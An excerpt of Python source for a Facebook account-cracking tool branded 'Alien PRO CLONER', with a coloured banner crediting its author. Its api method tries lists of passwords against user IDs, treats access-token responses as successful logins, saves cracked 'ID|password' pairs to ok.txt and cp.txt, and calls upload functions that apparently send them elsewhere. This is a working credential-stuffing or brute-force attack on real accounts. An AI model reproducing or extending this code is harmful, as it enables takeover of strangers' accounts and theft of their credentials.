...
\033[1;93m══════════════════════════════════════════════════
\033[0;96m [\033[0;96m✯\033[1;96m] \033[0;96mFB GROUP : Alierazor
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mGITHUB   : Alienrazor
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mWARNING  :  Alienrazor
\033[1;93m══════════════════════════════════════════════════
    """)   
		print("%s [%s•%s] %sTOOL NAME : %sAlien PRO CLONER"%(R,C,R,C,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [ALIEN] : %s/%s -> \033[0;92m [ ALIEN-OK:%s ]- \033[0;91m[ALIEN-CP:%s ]"%(C,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ALIEN-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [ALIEN-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			if "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[ALIEN-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [ALIEN-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
